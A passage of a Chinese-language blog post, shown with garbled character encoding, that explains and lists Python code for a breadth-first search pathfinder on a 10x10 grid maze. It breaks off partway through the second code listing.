</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†è¿™ä¸ªå¾…å®ç°çš„ç¨‹åºæŒ‰ç…§ä¹‹å‰æ‰€è®¨è®ºçš„åˆ†ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼š</p><p><a href="https://www.helloimg.com/image/BITMNm"><img src="https://www.helloimg.com/images/2021/04/11/BITMNm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/11/BITMNm.png" srcset="data:image/png;base64,666" alt="BITMNm.png"></a></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¸»è¦å°†ç¨‹åºåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><p>é¦–å…ˆæ˜¯å®šä¹‰ç›¸å…³çš„å˜é‡ï¼Œå¹¶ä¸”å°†åˆå§‹çŠ¶æ€æ”¾å…¥è¾¹ç•Œï¼›</p><p>ç„¶åè¿›å…¥å¾ªç¯ï¼š</p><ul>    <li>ç¬¬ä¸€æ­¥ï¼šæ£€æŸ¥è¾¹ç•Œçš„é•¿åº¦ï¼Œå¦‚æœç­‰äº0åˆ™è¯´æ˜æ— è§£</li>    <li>ç¬¬äºŒæ­¥ï¼šä»è¾¹ç•Œä¸­ç§»å»ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å°†æ­¤èŠ‚ç‚¹æ·»åŠ åˆ°è¡¨ç¤ºå·²æ¢ç´¢çš„æ•°æ®ç»“æ„</li>    <li>ç¬¬ä¸‰æ­¥ï¼šæ£€æŸ¥è¢«ç§»å»çš„èŠ‚ç‚¹ï¼Œå¦‚æœæ­¤èŠ‚ç‚¹åŒ…å«ç›®æ ‡çŠ¶æ€ï¼Œåˆ™è¿½è¸ªå…¶çˆ¶èŠ‚ç‚¹ï¼Œå¹¶è¿”å›è·¯å¾„</li></ul><p>æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå¾ªç¯æ¥è¿½è¸ªå®Œæ•´çš„è·¯å¾„ï¼Œå¹¶å°†å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p><p>ä»¥ä¸‹æ˜¯æ ¹æ®æ€è·¯å®ç°çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">                    <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                            map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                        <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                        current = trace</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                    print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">            j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">            <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">            condition = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">                <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                    condition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼š</p><ul>    <li>ç”±äºå¯¹Pythonä¸­ç±»çš„ä½¿ç”¨ä¸ç†Ÿç»ƒï¼Œå¯¼è‡´ä»£ç ä¸­æœ‰å…³éƒ¨åˆ†çœ‹èµ·æ¥å¾ˆå¥‡æ€ª</li>    <li>åœ¨éå†å½“å‰èŠ‚ç‚¹å‘¨å›´çš„æœ‰æ•ˆèŠ‚ç‚¹æ—¶ï¼Œæ²¡æœ‰é‡æ–°åˆå§‹åŒ–èŠ‚ç‚¹ï¼Œè€Œæ˜¯ç›´æ¥å°†å½“å‰èŠ‚ç‚¹å‘¨å›´æœ‰æ•ˆèŠ‚ç‚¹çš„åæ ‡åŠ å…¥è¾¹ç•Œï¼Œå¯¼è‡´å¾ªç¯ä»ç¬¬äºŒæ¬¡å¼€å§‹å°±æ— æ³•è¿›è¡Œï¼Œå› ä¸ºåæ ‡æ²¡æœ‰â€œå‘¨å›´çš„æœ‰æ•ˆèŠ‚ç‚¹â€è¿™ä¸ªå±æ€§</li>    <li>åœ¨å°†ä»¥æ¢ç´¢è¿‡çš„èŠ‚ç‚¹åŠ å…¥å¯¹åº”æ•°æ®ç»“æ„åï¼Œæ£€æŸ¥ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦åœ¨æ­¤æ•°æ®ç»“æ„æ—¶ç›´æ¥ä½¿ç”¨â€œ==â€ï¼Œä½†æ˜¯å³ä½¿åæ ‡ç›¸åŒçš„ä¸¤ä¸ªèŠ‚ç‚¹ä¹Ÿå¯èƒ½ä¸ç›¸ç­‰ï¼ŒåŸå› æ˜¯è¿™ä¸¤ä¸ªèŠ‚ç‚¹å­˜åœ¨äºä¸åŒçš„åœ°å€ï¼Œæ­£ç¡®çš„åšæ³•æ˜¯å†éå†ä¸€éå­˜å‚¨ä»¥æ¢ç´¢è¿‡çš„æ•°æ®ç»“æ„ï¼Œç›´æ¥æ¯”è¾ƒæ­¤æ•°æ®ç»“æ„ä¸­èŠ‚ç‚¹çš„åæ ‡å€¼</li></ul><p>åœ¨å®Œæˆåˆæ­¥çš„å®ç°åï¼Œå¤„äºå¯¹ä»£ç é‡æ„çš„è¦æ±‚ï¼Œå¯¹ä»£ç åšäº†ç›¸å…³çš„å‡½æ•°å°è£…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">map_show</span>(<span class="params">map1</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">map_show(map1)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route_trace</span>(<span class="params">current,explored</span>):</span></span><br><span class="line">    <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                    map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                current = trace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">frontier,explored,current</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">        j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">        <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">        condition = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                condition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span 